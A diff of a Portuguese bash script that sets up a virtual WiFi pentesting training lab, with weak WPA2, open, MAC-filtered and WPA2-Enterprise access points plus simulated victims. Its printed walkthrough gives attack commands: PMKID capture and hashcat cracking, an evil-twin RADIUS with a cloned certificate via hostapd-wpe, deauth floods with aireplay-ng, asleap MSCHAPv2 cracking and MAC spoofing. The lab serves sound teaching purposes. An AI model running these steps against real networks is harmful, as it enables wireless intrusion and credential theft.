@@ -1,39 +1,8 @@
 #!/usr/bin/env bash
 #
-# ============================================================================
-#  XPSec Academy - Lab WiFi Pentesting PRO (virtual / sem RF)  v3
-# ============================================================================
-#
-#  Novidades da v3 (sobre a v2):
-#   - PMKID clientless: AP WPA2-PSK dedicado em 5GHz. Aluno captura o PMKID
-#     do 1o quadro EAPOL com hcxdumptool e cracka com hashcat -m 22000.
-#     SEM cliente, SEM deauth (técnica moderna).
-#   - WPA2-Enterprise (EAP): hostapd-wpe como RADIUS/EAP falso em 5GHz.
-#     Uma vítima EAP-PEAP/MSCHAPv2 associa e vaza usuário + challenge/response,
-#     crackável com asleap / hashcat -m 5500.
-#   - Bandas 2.4GHz e 5GHz misturadas (iw reg set US) p/ variar o cenário.
-#
-#  Herdado da v2:
-#   - Rede OPEN com servidor HTTP + bot de login em texto claro.
-#   - WPA2-PSK no host.
-#
-#  (WEP e WPS foram removidos. O lab roda só com hostapd/wpa_supplicant
-#   no host, sem container Docker.)
-#
-#  MAPA DE REDES
-#  -------------
-#   2.4GHz:  XPSEC-WPA2 (ch11)          XPSEC-OPEN (ch3)
-#            XPSEC-MACACL (ch9, filtro de MAC)
-#   5GHz:    XPSEC-PMKID (ch36, clientless)
-#            XPSEC-CORP  (ch149, WPA2-Enterprise / hostapd-wpe)
-#
-#  ALVO: Kali Linux rolling, como root. Requer: iw, hostapd, wpasupplicant,
-#        dnsmasq, rfkill, python3. Opcional (cenários novos):
-#        hostapd-wpe, hcxdumptool, hcxtools, asleap, hashcat.
-#
-#  Tudo virtual: nenhum RF real, nada visível para dispositivos ao redor.
-#  `--down` destrói APs, clientes e descarrega o módulo.
-# ============================================================================
+# XPSec Academy - Lab WiFi Pentesting (virtual, sem RF).
+# Sobe os APs/clientes vulneráveis. O passo a passo de exploração de cada
+# rede está no README.md.
 
 set -u
 
@@ -49,8 +18,10 @@ OK()   { echo -e "\e[1;32m[ ok ]\e[0m $*"; }
 SSID_WPA2="XPSEC-WPA2";  WPA2_PSK="verao2024"          # fraca de propósito
 SSID_OPEN="XPSEC-OPEN"                                   # sem cripto
 SSID_PMKID="XPSEC-PMKID"; PMKID_PSK="familia10"         # 5GHz, clientless
-SSID_CORP="XPSEC-CORP"                                   # 5GHz, WPA2-Enterprise
+SSID_CORP="XPSEC-CORP"                                   # 5GHz, WPA2-Enterprise LEGÍTIMO
 CORP_IDENTITY="funcionario@xpsec.local"; CORP_PASS="Senha@Corp123"
+CORP_RADIUS_CN="radius.xpsec.local"                      # CN do cert do RADIUS legítimo
+CORP_CA_CN="XPSec Corp Root CA"                          # CN da CA raiz do lab
 SSID_MACACL="XPSEC-MACACL"                               # 2.4GHz, filtro de MAC (OPEN)
 MACACL_ALLOWED="02:ca:fe:00:11:22"                       # único MAC na allowlist
 
@@ -74,7 +45,7 @@ require_root() { [[ $EUID -eq 0 ]] || { ERR "Rode como root: sudo $0 $*"; exit 1
 # ---- instala automaticamente tudo que o lab usa (bin -> pacote) -----------
 install_deps() {
   # obrigatórios
-  local pkgs=(iw hostapd wpasupplicant rfkill dnsmasq python3 aircrack-ng)
+  local pkgs=(iw hostapd wpasupplicant rfkill dnsmasq python3 aircrack-ng openssl)
   # opcionais dos cenários (PMKID / Enterprise / MAC bypass / cracking)
   pkgs+=(hostapd-wpe hcxdumptool hcxtools asleap hashcat macchanger)
 
@@ -121,6 +92,7 @@ check_deps() {
   command -v hcxdumptool >/dev/null 2>&1 || opt+=("hcxdumptool(PMKID)")
   command -v hcxpcapngtool >/dev/null 2>&1 || opt+=("hcxtools(PMKID)")
   command -v asleap >/dev/null 2>&1 || opt+=("asleap(Enterprise crack)")
+  command -v openssl >/dev/null 2>&1 || opt+=("openssl(PKI do CORP legítimo)")
   ((${#opt[@]})) && WARN "Opcionais p/ cenários novos: ${opt[*]}  ->  apt install -y hostapd-wpe hcxdumptool hcxtools asleap hashcat"
 }
 
@@ -245,28 +217,48 @@ EOF
     && OK "AP $SSID_PMKID (5GHz ch36, PMKID clientless)" \
     || ERR "PMKID falhou. Log: $LAB_DIR/hostapd_pmkid.log"
 
-  start_corp_enterprise
+  start_corp_legit
 }
 
-start_corp_enterprise() {
-  if ! command -v hostapd-wpe >/dev/null 2>&1; then
-    WARN "hostapd-wpe ausente; tentando instalar..."
-    apt-get install -y -qq hostapd-wpe >/dev/null 2>&1 \
-      || { WARN "Sem hostapd-wpe. Pulando Enterprise. (apt install -y hostapd-wpe)"; return 1; }
-  fi
-  local base="/etc/hostapd-wpe/hostapd-wpe.conf"
-  if [[ -f "$base" ]]; then
-    # reaproveita os certs que já vêm no pacote; só troca iface/ssid/banda
-    cp "$base" "$LAB_DIR/ap_corp.conf"
-    sed -i "s/^interface=.*/interface=${AP_CORP}/"  "$LAB_DIR/ap_corp.conf"
-    sed -i "s/^ssid=.*/ssid=${SSID_CORP}/"          "$LAB_DIR/ap_corp.conf"
-    sed -i "s/^hw_mode=.*/hw_mode=a/"               "$LAB_DIR/ap_corp.conf"
-    sed -i "s/^channel=.*/channel=149/"             "$LAB_DIR/ap_corp.conf"
-    grep -q "^country_code" "$LAB_DIR/ap_corp.conf" || echo "country_code=US" >> "$LAB_DIR/ap_corp.conf"
-    grep -q "^ieee80211d"   "$LAB_DIR/ap_corp.conf" || echo "ieee80211d=1"    >> "$LAB_DIR/ap_corp.conf"
-  else
-    WARN "Config base do hostapd-wpe não encontrada; gerando mínima (confira certs em /etc/hostapd-wpe/certs)."
-    cat > "$LAB_DIR/ap_corp.conf" <<EOF
+# ---- PKI corporativa LEGÍTIMA (CA própria + cert do RADIUS) ---------------
+# O evil twin do aluno NÃO tem esta chave privada: por isso ele precisa CLONAR
+# a identidade (subject/CN) do certificado, não copiá-lo de verdade.
+corp_make_pki() {
+  local d="$LAB_DIR/corp-pki"
+  [[ -f "$d/server.pem" && -f "$d/server.key" && -f "$d/ca.pem" && -f "$d/dh.pem" ]] && return 0
+  command -v openssl >/dev/null 2>&1 || { WARN "openssl ausente; não dá p/ gerar a PKI do CORP legítimo."; return 1; }
+  mkdir -p "$d"
+  LOG "Gerando PKI corporativa legítima (CA + cert do RADIUS, CN=${CORP_RADIUS_CN})..."
+  # CA raiz do lab
+  openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
+    -keyout "$d/ca.key" -out "$d/ca.pem" \
+    -subj "/O=XPSec Corp/CN=${CORP_CA_CN}" >/dev/null 2>&1
+  # Chave + CSR do RADIUS legítimo
+  openssl req -newkey rsa:2048 -nodes \
+    -keyout "$d/server.key" -out "$d/server.csr" \
+    -subj "/O=XPSec Corp/CN=${CORP_RADIUS_CN}" >/dev/null 2>&1
+  cat > "$d/server.ext" <<EXT
+subjectAltName=DNS:${CORP_RADIUS_CN}
+extendedKeyUsage=serverAuth
+EXT
+  openssl x509 -req -in "$d/server.csr" -CA "$d/ca.pem" -CAkey "$d/ca.key" \
+    -CAcreateserial -days 3650 -extfile "$d/server.ext" \
+    -out "$d/server.pem" >/dev/null 2>&1
+  # DH params (-dsaparam = rápido; lab, segurança não importa)
+  openssl dhparam -dsaparam -out "$d/dh.pem" 2048 >/dev/null 2>&1
+  # Base de usuários do EAP server interno do hostapd (PEAP + MSCHAPv2)
+  cat > "$d/corp.eap_user" <<EOF
+*               PEAP
+"${CORP_IDENTITY}"      MSCHAPV2        "${CORP_PASS}"  [2]
+EOF
+  [[ -f "$d/server.pem" ]] && OK "PKI pronta (RADIUS legítimo assinado pela ${CORP_CA_CN})." \
+    || { WARN "Falha gerando a PKI corporativa."; return 1; }
+}
+
+# ---- AP corporativo LEGÍTIMO (hostapd + EAP server interno) ----------------
+start_corp_legit() {
+  corp_make_pki || { WARN "Sem PKI; Enterprise legítimo pulado."; return 1; }
+  cat > "$LAB_DIR/ap_corp.conf" <<EOF
 interface=${AP_CORP}
 driver=nl80211
 ssid=${SSID_CORP}
@@ -280,17 +272,15 @@ wpa_key_mgmt=WPA-EAP
 rsn_pairwise=CCMP
 ieee8021x=1
 eap_server=1
-eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
-ca_cert=/etc/hostapd-wpe/certs/ca.pem
-server_cert=/etc/hostapd-wpe/certs/server.pem
-private_key=/etc/hostapd-wpe/certs/server.pem
-private_key_passwd=whatever
-dh_file=/etc/hostapd-wpe/certs/dh
+eap_user_file=${LAB_DIR}/corp-pki/corp.eap_user
+ca_cert=${LAB_DIR}/corp-pki/ca.pem
+server_cert=${LAB_DIR}/corp-pki/server.pem
+private_key=${LAB_DIR}/corp-pki/server.key
+dh_file=${LAB_DIR}/corp-pki/dh.pem
 EOF
-  fi
-  hostapd-wpe -B -t -f "$LAB_DIR/hostapd_corp.log" "$LAB_DIR/ap_corp.conf" \
-    && OK "AP $SSID_CORP (5GHz ch149, WPA2-Enterprise / hostapd-wpe)" \
-    || { ERR "hostapd-wpe falhou. Log: $LAB_DIR/hostapd_corp.log"; return 1; }
+  hostapd -B -t -f "$LAB_DIR/hostapd_corp.log" "$LAB_DIR/ap_corp.conf" \
+    && OK "AP $SSID_CORP (5GHz ch149, WPA2-Enterprise LEGÍTIMO; RADIUS CN=${CORP_RADIUS_CN})" \
+    || { ERR "hostapd (CORP legítimo) falhou. Log: $LAB_DIR/hostapd_corp.log"; return 1; }
 }
 
 # ===========================================================================
@@ -419,8 +409,12 @@ EOF
 }
 
 start_corp_victim() {
-  command -v hostapd-wpe >/dev/null 2>&1 || return 0   # sem AP Enterprise, sem vítima
-  LOG "Vítima Enterprise (EAP-PEAP/MSCHAPv2) associando..."
+  [[ -f "$LAB_DIR/ap_corp.conf" ]] || return 0   # sem AP Enterprise legítimo, sem vítima
+  LOG "Vítima Enterprise (EAP-PEAP/MSCHAPv2) associando ao RADIUS legítimo..."
+  # VULNERABILIDADE DE PROPÓSITO: a vítima NÃO define ca_cert nem
+  # domain_suffix_match -> não valida o certificado do servidor. É isto que o
+  # evil twin do aluno explora. (Com ca_cert fixado na CA do lab, o ataque
+  # falharia -> essa seria a defesa correta.)
   cat > "$LAB_DIR/sta_corp.conf" <<EOF
 ctrl_interface=/run/wpa_corp
 network={
@@ -433,7 +427,7 @@ network={
 }
 EOF
   wpa_supplicant -B -i "$STA_CORP" -c "$LAB_DIR/sta_corp.conf" -f "$LAB_DIR/sta_corp.log" 2>/dev/null \
-    && OK "  Vítima $STA_CORP -> $SSID_CORP (vaza MSCHAPv2 p/ hostapd-wpe)" \
+    && OK "  Vítima $STA_CORP -> $SSID_CORP (conecta no AP legítimo; sem validar cert)" \
     || WARN "  Vítima EAP não associou (ver $LAB_DIR/sta_corp.log)"
 }
 
@@ -481,7 +475,7 @@ print_summary() {
   cat <<EOF
 
 $(echo -e '\e[1;32m')==================================================================$(echo -e '\e[0m')
-  LAB XPSEC WIFI PRO v3 NO AR   (100% virtual, sem RF real)
+  LAB XPSEC WIFI NO AR   (100% virtual, sem RF real)
 $(echo -e '\e[1;32m')==================================================================$(echo -e '\e[0m')
 
   2.4GHz
@@ -490,7 +484,7 @@ $(echo -e '\e[1;32m')===========================================================
    3) $SSID_MACACL ch 9   ABERTA + filtro de MAC (autorizado: $MACACL_ALLOWED)
   5GHz
    4) $SSID_PMKID  ch 36  WPA2-PSK CLIENTLESS p/ PMKID  (senha: $PMKID_PSK)
-   5) $SSID_CORP   ch 149 WPA2-Enterprise via hostapd-wpe (vítima: $CORP_IDENTITY)
+   5) $SSID_CORP   ch 149 WPA2-Enterprise LEGÍTIMO (RADIUS CN=$CORP_RADIUS_CN; vítima: $CORP_IDENTITY)
 
   Interfaces p/ o aluno: monitor=$MON_IF  |  atacante (managed)=$ATK
   Configs/logs:  $LAB_DIR
@@ -515,10 +509,20 @@ $(echo -e '\e[1;32m')===========================================================
   hcxpcapngtool -o /tmp/pmkid.22000 /tmp/pmkid.pcapng
   printf 'familia10\\n12345678\\n' > /tmp/wlp.txt ; hashcat -m 22000 /tmp/pmkid.22000 /tmp/wlp.txt
 
-  # WPA2-Enterprise (5GHz): hostapd-wpe JÁ captura quando a vítima conecta
-  grep -A3 -i mschapv2 $LAB_DIR/hostapd_corp.log      # username / challenge / response
-  asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
-  #   (alternativa: hashcat -m 5500)
+  # WPA2-Enterprise (5GHz ch149): evil twin + clonagem de cert (100% manual)
+  #  O XPSEC-CORP é um RADIUS LEGÍTIMO; a vítima conecta nele e NÃO vaza nada.
+  #  Você monta o ataque. Passo a passo detalhado no README.md. Resumo:
+  sudo airodump-ng -c 149 --band a $MON_IF                       # 1) ache o BSSID do CORP
+  openssl req -x509 -newkey rsa:2048 -nodes -days 3650 \
+    -keyout /tmp/clone.key -out /tmp/clone.pem \
+    -subj "/O=XPSec Corp/CN=$CORP_RADIUS_CN" \
+    -addext "subjectAltName=DNS:$CORP_RADIUS_CN"                 # 2) clone o cert do RADIUS
+  openssl dhparam -dsaparam -out /tmp/dh.pem 2048
+  # 3) crie /tmp/evil_corp.conf (hostapd-wpe em $ATK, ch153, SSID $SSID_CORP,
+  #    ca_cert/server_cert=/tmp/clone.pem, private_key=/tmp/clone.key) -> ver README
+  sudo hostapd-wpe -s /tmp/evil_corp.conf                        # 4) sobe o rogue RADIUS
+  sudo aireplay-ng -0 0 -a <BSSID_CORP> $MON_IF                  # 5) deauth (outro terminal)
+  asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt  # 6) crackeia
 
   # MAC filter bypass (2.4, ch9): descubra o MAC autorizado e clone-o
   sudo airodump-ng -c 9 --bssid <BSSID_MACACL> $MON_IF   # veja o STATION autorizado
